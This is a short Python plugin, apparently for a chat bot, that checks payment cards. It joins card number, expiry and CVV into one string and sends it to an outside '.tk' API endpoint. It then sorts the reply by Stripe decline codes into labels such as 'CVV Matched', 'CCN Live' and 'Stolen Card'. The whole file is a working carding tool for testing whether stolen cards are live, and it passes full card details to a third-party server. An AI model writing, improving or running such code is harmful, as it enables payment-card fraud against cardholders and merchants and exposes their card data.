import requests
from plugins.func.users_sql import *
session = requests.session()
def auth_func(r,cc,cvv,mes,ano,):
  try:
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"
    authurl = f"""https://www.mainulhasanbd.tk/prvbotauth/api.php?lista={cc}|{mes}|{ano}|{cvv}"""
    reqone = session.get(authurl)
    result = reqone.text
    if "succeeded" in result:
      response = "CVV Matched ✅"
      
    elif "insufficient_funds" in result:
      response = "Insufficient Funds ❎"
      
    elif "incorrect_cvc" in result:
      response = "CCN Live ❎"
      
    elif "transaction_not_allowed" in result:
      response = "Card Doesn't Support Purchase ❎"
    elif "do_not_honor" in result:
      response = "Do Not Honor 🚫"
    elif "stolen_card" in result:
      response = "Stolen Card 🚫"
    elif "lost_card" in result:
      response = "Lost Card 🚫"
    elif "pickup_card" in result:
      response = "Pickup Card 🚫"
    elif "incorrect_number" in result:
      response = "Incorrect Card Number 🚫"
    elif "expired_card" in result:
      response = "Expired Card 🚫"
    elif "generic_decline" in result:
      response = "Generic Decline 🚫"
    elif "fraudulent" in result:
      response = "Fraudulent 🚫"
    elif "lock_timeout" in result:
      response = "Api Error 🚫"
    elif "Your card was declined." in result:
      response = "Generic Decline 🚫"
    elif "intent_confirmation_challenge" in result:
      response = "Captcha 😥"
    elif "stripe_3ds2_fingerprint" in result:
      response = "3D Secured ❎"
    elif "Your card does not support this type of purchase." in result:
      response = "Locked Card 🚫"
    elif "parameter_invalid_empty" in result:
      response = "404 error 🚫"
    elif "invalid_request_error" in result:
      response = "404 error 🚫"
  
    else:
      response = "Generic Decline 🚫"
  
    return (f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Result - {response}</b>\n")
  except Exception as e:
      print(e)